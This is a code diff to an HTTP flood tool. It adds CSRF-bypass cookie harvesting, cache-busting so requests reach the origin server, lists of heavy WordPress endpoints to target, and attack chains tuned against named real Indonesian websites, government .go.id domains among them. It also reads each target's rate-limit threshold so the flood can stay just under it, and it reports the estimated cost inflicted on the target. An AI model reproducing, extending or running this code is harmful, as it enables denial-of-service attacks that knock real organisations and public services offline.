@@ -1421,6 +1421,125 @@ class AsyncHttpFlood(Thread):
             print(f"{bcolors.OKGREEN}[SIEGE AAR] After-Action Report written to: {filename}{bcolors.RESET}")
         except: pass
 
+    def _chaos_laravel_xsrf_harvest(self):
+        """[V32] Laravel XSRF Token Harvester.
+        Laravel apps (like konisolo.com, surakarta.go.id) set XSRF-TOKEN cookies.
+        By harvesting and replaying them, POST requests bypass CSRF middleware,
+        making POST_DYN attacks devastatingly effective against Laravel backends."""
+        intel = self._chaos_intel
+        if intel.get("backend_framework") != "laravel" and intel.get("cms_type") != "laravel":
+            return
+            
+        # Only harvest every 30 executions to keep it fresh (tokens rotate)
+        if intel["total_executions"] % 30 != 0:
+            return
+            
+        try:
+            import urllib.request
+            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/")
+            req.add_header('User-Agent', 'Mozilla/5.0')
+            with urllib.request.urlopen(req, timeout=3) as resp:
+                cookies_raw = resp.headers.get('Set-Cookie', '')
+                if 'XSRF-TOKEN' in cookies_raw or 'laravel_session' in cookies_raw:
+                    import re
+                    xsrf = re.search(r'XSRF-TOKEN=([^;]+)', cookies_raw)
+                    sess = re.search(r'laravel_session=([^;]+)', cookies_raw)
+                    if xsrf:
+                        intel["harvested_cookies"]["XSRF-TOKEN"] = xsrf.group(1)
+                    if sess:
+                        intel["harvested_cookies"]["laravel_session"] = sess.group(1)
+                    if xsrf or sess:
+                        if int(REQUESTS_SENT) < 500:
+                            print(f"{bcolors.OKGREEN}[CHAOS LARAVEL] XSRF-TOKEN & Session harvested. POST attacks will bypass CSRF.{bcolors.RESET}")
+        except: pass
+
+    def _chaos_litespeed_cache_bypass(self):
+        """[V32] LiteSpeed Cache Bypass Strategy.
+        Learned from hardosoloplast.com: LiteSpeed Cache uses X-LiteSpeed-Tag for cache keys.
+        By rotating User-Agent (Vary: User-Agent) and adding unique query strings,
+        we force cache MISS on every request, hitting the origin PHP directly."""
+        intel = self._chaos_intel
+        if intel.get("server_type") != "litespeed":
+            return
+            
+        # Flag that we know this is LiteSpeed and must use cache-busting on EVERY request
+        if "litespeed_cache_bypass" not in intel.get("infra_map", {}):
+            intel["infra_map"]["litespeed_cache_bypass"] = True
+            intel["infra_map"]["vary_user_agent"] = True
+            if int(REQUESTS_SENT) < 200:
+                print(f"{bcolors.OKCYAN}[CHAOS LITESPEED] Vary:User-Agent detected. Rotating fingerprints per-request for cache MISS.{bcolors.RESET}")
+
+    def _chaos_wp_json_exploitation(self):
+        """[V32] WordPress REST API Endpoint Discovery and Exploitation.
+        Learned from puskesjaten1: the Link header exposes /wp-json/ endpoint.
+        We add heavy WP REST API endpoints to the multi-path queue."""
+        intel = self._chaos_intel
+        if intel.get("cms_type") != "wordpress":
+            return
+        if "wp_json_mapped" in intel.get("infra_map", {}):
+            return
+            
+        intel["infra_map"]["wp_json_mapped"] = True
+        
+        # Pre-load known heavy WordPress REST API endpoints
+        wp_heavy_endpoints = [
+            "/wp-json/wp/v2/posts?per_page=100",
+            "/wp-json/wp/v2/pages?per_page=100",
+            "/wp-json/wp/v2/comments?per_page=100",
+            "/wp-json/wp/v2/users",
+            "/wp-json/wp/v2/media?per_page=100",
+            "/wp-json/wp/v2/categories?per_page=100",
+            "/wp-json/wp/v2/tags?per_page=100",
+            "/wp-json/wp/v2/search?search=" + ProxyTools.Random.rand_str(8),
+            "/wp-json/wp/v2/posts?search=" + ProxyTools.Random.rand_str(5),
+            "/?feed=rss2",
+            "/?feed=atom",
+            "/wp-login.php",
+            "/wp-admin/admin-ajax.php",
+            "/wp-cron.php",
+        ]
+        
+        for ep in wp_heavy_endpoints:
+            if ep not in intel["endpoints_discovered"]:
+                intel["endpoints_discovered"].append(ep)
+                
+        # Build multi-path queue with these endpoints
+        for ep in wp_heavy_endpoints[:8]:
+            intel["multi_path_queue"].append((ep, "POST_DYN" if "ajax" in ep or "login" in ep else "WP_SEARCH"))
+            
+        if int(REQUESTS_SENT) < 200:
+            print(f"{bcolors.OKCYAN}[CHAOS WP-JSON] {len(wp_heavy_endpoints)} WordPress REST API attack endpoints loaded.{bcolors.RESET}")
+
+    def _chaos_gov_id_heuristics(self):
+        """[V32] Indonesian Government Site (.go.id) Heuristics.
+        Government sites typically share common weaknesses:
+        - Old PHP versions, unpatched WordPress/Laravel
+        - Apache/Nginx without WAF
+        - Rate limits set but poorly enforced (e.g. surakarta.go.id X-RateLimit-Limit:200)
+        - HSTS present but no Cloudflare"""
+        intel = self._chaos_intel
+        host = str(self._target.authority).lower()
+        
+        if ".go.id" in host and not intel.get("infra_map", {}).get("gov_heuristics_applied"):
+            intel["infra_map"]["gov_heuristics_applied"] = True
+            
+            # Override CMS to government profile if still unknown
+            if not intel.get("cms_type") or intel["cms_type"] == "custom":
+                intel["cms_type"] = "government"
+                
+            # Government sites usually have these vulnerable paths
+            gov_endpoints = [
+                "/api/", "/login", "/admin", "/administrator",
+                "/wp-admin/", "/wp-login.php", "/xmlrpc.php",
+                "/public/", "/storage/", "/uploads/",
+            ]
+            for ep in gov_endpoints:
+                if ep not in intel["endpoints_discovered"]:
+                    intel["endpoints_discovered"].append(ep)
+                    
+            if int(REQUESTS_SENT) < 100:
+                print(f"{bcolors.WARNING}[CHAOS GOV-ID] Indonesian government domain detected. Applying .go.id heuristics.{bcolors.RESET}")
+
     def _chaos_dead_drop_dns(self):
         """Dead Drop DNS Resolution.
         Bypasses standard OS DNS caches to manually query the true origin IP of the target
@@ -3464,6 +3583,27 @@ class HttpFlood(Thread):
         # --- StackPath (smaller CDN, hosting providers) ---
         ("stackpath", "nginx", "custom"):     {"STEALTH_JA3": 60, "POST_DYN": 35, "SLOW_V2": 25},
         ("stackpath", "apache", "wordpress"): {"STEALTH_JA3": 55, "WP_SEARCH": 60, "XMLRPC_AMP": 50},
+        # ===================================================================
+        # REAL-WORLD FIELD DATA: Indonesian Government & Corporate Targets
+        # Trained from live recon: konisolo.com, puskesjaten1, hardosoloplast, surakarta.go.id
+        # ===================================================================
+        # --- LiteSpeed + Laravel (konisolo.com pattern: PHP 8.2, no CDN, XSRF-TOKEN) ---
+        ("none", "litespeed", "laravel"):     {"POST_DYN": 80, "STRESS": 55, "SLOW_V2": 45, "DYN": 40, "PPS": 35},
+        ("none", "litespeed", "custom"):      {"POST_DYN": 70, "STRESS": 50, "DYN": 45, "SLOW_V2": 40},
+        # --- Nginx + WordPress bare (puskesjaten1 pattern: no WAF, wp-json exposed) ---
+        ("none", "nginx", "wordpress"):       {"XMLRPC_AMP": 90, "WP_SEARCH": 85, "POST_DYN": 50, "SLOW_V2": 40, "DYN": 35},
+        # --- LiteSpeed + WordPress + LSCache (hardosoloplast pattern: Vary:User-Agent) ---
+        ("none", "litespeed", "wordpress"):   {"WP_SEARCH": 85, "XMLRPC_AMP": 75, "POST_DYN": 55, "DYN": 40, "STRESS": 35},
+        # --- Apache + Laravel + Rate-Limit (surakarta.go.id: X-RateLimit-Limit:200, HSTS, CSP) ---
+        ("none", "apache", "laravel"):        {"POST_DYN": 75, "SLOW_V2": 60, "STEALTH_JA3": 55, "DYN": 45, "COOKIE": 30},
+        # --- Generic .go.id government pattern (Apache, old PHP, minimal WAF) ---
+        ("none", "apache", "government"):     {"SLOW_V2": 65, "POST_DYN": 55, "STRESS": 45, "WP_SEARCH": 40, "GET": 30},
+        ("none", "nginx", "government"):      {"POST_DYN": 60, "SLOW_V2": 55, "STRESS": 40, "DYN": 35},
+        # --- LiteSpeed + Cloudflare (common Indonesian hosting combo) ---
+        ("cloudflare", "litespeed", "laravel"): {"STEALTH_JA3": 80, "POST_DYN": 50, "SLOW_V2": 35, "DYN": 25},
+        ("cloudflare", "litespeed", "custom"):  {"STEALTH_JA3": 75, "POST_DYN": 45, "DYN": 30},
+        # --- Apache + Cloudflare + Laravel (enterprise .go.id behind CDN) ---
+        ("cloudflare", "apache", "laravel"):  {"STEALTH_JA3": 75, "POST_DYN": 55, "SLOW_V2": 40, "COOKIE": 25},
         # --- Wordfence + Cloudflare Double Protection ---
         ("cloudflare", "nginx", "wordpress"): {"STEALTH_JA3": 80, "WP_SEARCH": 60, "XMLRPC_AMP": 50},
         # --- IIS Servers (Corporate / Government / Legacy .NET Apps) ---
@@ -3491,6 +3631,19 @@ class HttpFlood(Thread):
         "cookie_monster":   ["COOKIE", "STEALTH_JA3", "POST_DYN", "COOKIE", "DYN"],
         "bot_swarm":        ["BOT", "GET", "BOT", "STEALTH_JA3", "BOT"],
         "db_destroyer":     ["WP_SEARCH", "WP_SEARCH", "XMLRPC_AMP", "WP_SEARCH", "WP_SEARCH"],
+        # --- V32: Real-World Trained Combo Chains ---
+        # Trained from konisolo.com (LiteSpeed+Laravel: POST_DYN hammers Eloquent ORM)
+        "laravel_breaker":  ["POST_DYN", "STRESS", "POST_DYN", "DYN", "POST_DYN", "SLOW_V2"],
+        # Trained from puskesjaten1 (Nginx+WP bare: total WP annihilation without restraint)
+        "wp_bare_nuke":     ["XMLRPC_AMP", "WP_SEARCH", "XMLRPC_AMP", "WP_SEARCH", "POST_DYN", "XMLRPC_AMP"],
+        # Trained from hardosoloplast (LiteSpeed+WP+Cache: fuzz queries to bypass LSCache)
+        "lscache_piercer":  ["WP_SEARCH", "DYN", "WP_SEARCH", "STEALTH_JA3", "WP_SEARCH", "POST_DYN"],
+        # Trained from surakarta.go.id (Apache+Laravel+RateLimit: stealth under threshold)
+        "gov_infiltrator":  ["STEALTH_JA3", "SLOW_V2", "POST_DYN", "COOKIE", "STEALTH_JA3", "SLOW_V2"],
+        # Generic Indonesian government site chain (usually weak Apache + old PHP)
+        "indo_gov_siege":   ["SLOW_V2", "SLOW_V2", "POST_DYN", "STRESS", "SLOW_V2", "PPS"],
+        # LiteSpeed HTTP/3 exploitation (alt-svc h3 detected on both LS sites)
+        "litespeed_h3_flood": ["STRESS", "PPS", "POST_DYN", "STRESS", "DYN", "PPS"],
     }
     
     def _chaos_save_memory(self):
@@ -4887,8 +5040,9 @@ class HttpFlood(Thread):
                     intel["cms_type"] = "drupal"
                 elif 'shopify' in body or 'cdn.shopify' in body:
                     intel["cms_type"] = "shopify"
-                elif 'laravel' in powered_by or 'x-csrf-token' in body:
+                elif 'laravel' in powered_by or 'x-csrf-token' in body or 'xsrf-token' in headers_raw:
                     intel["cms_type"] = "laravel"
+                    intel["backend_framework"] = "laravel"
                 elif 'next' in powered_by or '__next' in body:
                     intel["cms_type"] = "nextjs"
                 else:
@@ -4899,9 +5053,19 @@ class HttpFlood(Thread):
                 if any(sig in all_signals for sig in captcha_signals):
                     intel["has_captcha"] = True
                     
-                # --- Detect Rate Limiting ---
+                # --- Detect Rate Limiting (V32: Extract exact threshold) ---
                 if 'x-ratelimit' in headers_raw or 'retry-after' in headers_raw or 'x-rate-limit' in headers_raw:
                     intel["has_rate_limit"] = True
+                    intel["rate_limit_probed"] = True
+                    # Try to extract the exact numeric limit from response headers
+                    try:
+                        raw_hdrs = str(resp.headers) if hasattr(resp, 'headers') else headers_raw
+                        import re
+                        rl_match = re.search(r'X-RateLimit-Limit:\s*(\d+)', raw_hdrs, re.IGNORECASE)
+                        if rl_match:
+                            intel["rate_limit_threshold"] = int(rl_match.group(1))
+                            print(f"{bcolors.WARNING}[CHAOS RECON] Rate-Limit threshold extracted: {intel['rate_limit_threshold']} req/window{bcolors.RESET}")
+                    except: pass
                     
         except Exception:
             intel["waf_type"] = "unknown_heavy"
@@ -5567,6 +5731,12 @@ class HttpFlood(Thread):
         # Phase 1.10.6: SSL FINGERPRINTING (run once early)
         self._chaos_ssl_fingerprint()
         
+        # Phase 1.10.7: V32 REAL-WORLD INTELLIGENCE MODULES
+        self._chaos_laravel_xsrf_harvest()
+        self._chaos_litespeed_cache_bypass()
+        self._chaos_wp_json_exploitation()
+        self._chaos_gov_id_heuristics()
+        
         self._chaos_dead_drop_dns()
         self._chaos_honeypot_scanner()
         self._chaos_build_topology_mesh()
@@ -5998,6 +6168,14 @@ class HttpFlood(Thread):
                 print(f"  Siege Phase : {s_col}{siege}{bcolors.RESET} | Elapsed: {elapsed_m}m {elapsed_s}s | Circadian: {circ}")
                 print(f"  Financial   : Est. Target Costs: {bcolors.FAIL}${financial:.4f} USD{bcolors.RESET} (Egress + Compute + WAF)")
                 print(f"  Conn Pool   : {pool_pct}% of target's pool exhausted | SSL CN: {ssl_cn}")
+                infra = intel.get("infra_map", {})
+                v32_mods = []
+                if infra.get("litespeed_cache_bypass"): v32_mods.append("LSCache-Bypass")
+                if infra.get("wp_json_mapped"): v32_mods.append("WP-JSON-Exploit")
+                if infra.get("gov_heuristics_applied"): v32_mods.append("GovID-Intel")
+                if intel.get("harvested_cookies", {}).get("XSRF-TOKEN"): v32_mods.append("XSRF-Hijack")
+                if v32_mods:
+                    print(f"  Field Intel : {bcolors.OKGREEN}{" | ".join(v32_mods)}{bcolors.RESET}")
                 print(f"  Attack Rate : {intel.get('adaptive_rpc', 10)} RPC | Jitter: {intel.get('jitter_ms', 0)}ms")
                 # Show WAF rules detected
                 rules = intel.get("waf_rules_triggered", [])
